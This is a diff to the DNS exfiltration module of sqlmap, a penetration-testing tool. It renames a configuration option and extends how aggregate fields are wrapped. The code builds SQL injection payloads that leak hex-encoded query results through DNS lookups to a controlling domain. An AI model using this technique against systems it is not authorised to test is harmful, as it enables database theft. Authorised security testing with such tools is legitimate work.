@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2015 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
@@ -46,7 +46,7 @@ def dnsUse(payload, expression):
     count = 0
     offset = 1
 
-    if conf.dnsName and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL):
+    if conf.dnsDomain and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL):
         output = hashDBRetrieve(expression, checkConf=True)
 
         if output and PARTIAL_VALUE_MARKER in output or kb.dnsTest is None:
@@ -61,11 +61,15 @@ def dnsUse(payload, expression):
                 chunk_length = MAX_DNS_LABEL / 2 if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL) else MAX_DNS_LABEL / 4 - 2
                 _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)
                 nulledCastedField = agent.nullAndCastField(fieldToCastStr)
+                extendedField = re.search(r"[^ ,]*%s[^ ,]*" % re.escape(fieldToCastStr), expression).group(0)
+                if extendedField != fieldToCastStr:  # e.g. MIN(surname)
+                    nulledCastedField = extendedField.replace(fieldToCastStr, nulledCastedField)
+                    fieldToCastStr = extendedField
                 nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, chunk_length)
                 nulledCastedField = agent.hexConvertField(nulledCastedField)
                 expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)
 
-                expressionRequest = getSQLSnippet(Backend.getIdentifiedDbms(), "dns_request", PREFIX=prefix, QUERY=expressionReplaced, SUFFIX=suffix, DOMAIN=conf.dnsName)
+                expressionRequest = getSQLSnippet(Backend.getIdentifiedDbms(), "dns_request", PREFIX=prefix, QUERY=expressionReplaced, SUFFIX=suffix, DOMAIN=conf.dnsDomain)
                 expressionUnescaped = unescaper.escape(expressionRequest)
 
                 if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.PGSQL):
@@ -107,7 +111,7 @@ def dnsUse(payload, expression):
             debugMsg = "performed %d queries in %.2f seconds" % (count, calculateDeltaSeconds(start))
             logger.debug(debugMsg)
 
-    elif conf.dnsName:
+    elif conf.dnsDomain:
         warnMsg = "DNS data exfiltration method through SQL injection "
         warnMsg += "is currently not available for DBMS %s" % Backend.getIdentifiedDbms()
         singleTimeWarnMessage(warnMsg)
